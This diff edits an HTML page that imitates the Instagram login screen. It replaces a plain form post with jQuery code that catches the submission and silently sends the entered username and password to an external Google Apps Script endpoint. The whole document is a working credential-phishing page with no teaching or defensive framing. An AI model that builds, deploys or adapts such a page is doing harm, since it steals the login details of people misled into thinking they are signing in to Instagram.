@@ -4,7 +4,7 @@
 <meta charset="utf-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 
 <style type="text/css">
 	body {
@@ -56,7 +56,7 @@ body {
 	<img id="Instagram-Logo" src="Instagram-Logo.png" srcset="Instagram-Logo.png 1x, Instagram-Logo@2x.png 2x">
 
 
-	<form action="https://script.google.com/macros/s/AKfycbzlfLDcBS8dMqst1FvJpwA8tfE6sdIAtYhPW2pYsInYPCthPaOEQI76CA8ug0pof1dfAQ/exec" method="post">
+	<form id="submit-form">
     <input  class="Rectangle_1" id="Rectangle_1" type="text" name="email" placeholder="Phone number, username, or email" required="">
 	<input  class="Rectangle_2" id="Rectangle_2" type="password" name="password" placeholder="Password" required="">
     <input id="Rectangle_3" class="Rectangle_3" style="color: white; background-color: #0095f6;" type="submit" value="Log In" onsubmit="getData">
@@ -163,6 +163,17 @@ body {
 		</path>
 	</svg>
 </div>
-</center>
+	</center>
+           <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbzlfLDcBS8dMqst1FvJpwA8tfE6sdIAtYhPW2pYsInYPCthPaOEQI76CA8ug0pof1dfAQ/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+         
+            })
+        })
+	</script>
 </body>
 </html>
